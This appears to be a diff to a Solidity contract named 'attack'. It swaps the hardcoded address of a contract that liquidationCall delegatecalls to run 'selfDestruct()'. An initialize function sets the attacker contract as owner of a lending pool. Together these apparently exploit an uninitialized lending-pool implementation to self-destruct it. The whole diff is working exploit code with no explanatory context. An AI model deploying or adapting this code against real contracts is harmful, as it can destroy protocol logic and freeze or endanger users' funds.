@@ -16,9 +16,9 @@ contract attack {
     function initialize() public{
         lendingpool.initialize(address(this));
     }
-    //address destruct = 0xE61E97509821F60b200b1B402d74D76e827ca72a
+    //address destruct = 0x32FE9b67Ce363876792ad55CF6587f08f45b1d7f
     function liquidationCall(address collateralAsset,address debtAsset,address user,uint256 debtToCover,bool receiveAToken) public  returns(uint, string memory) {
-        (bool success,) = (0xE61E97509821F60b200b1B402d74D76e827ca72a).delegatecall(abi.encodeWithSignature("selfDestruct()"));
+        (bool success,) = (0x32FE9b67Ce363876792ad55CF6587f08f45b1d7f).delegatecall(abi.encodeWithSignature("selfDestruct()"));
         require(success,"failed call");
         return (0, "");
     }
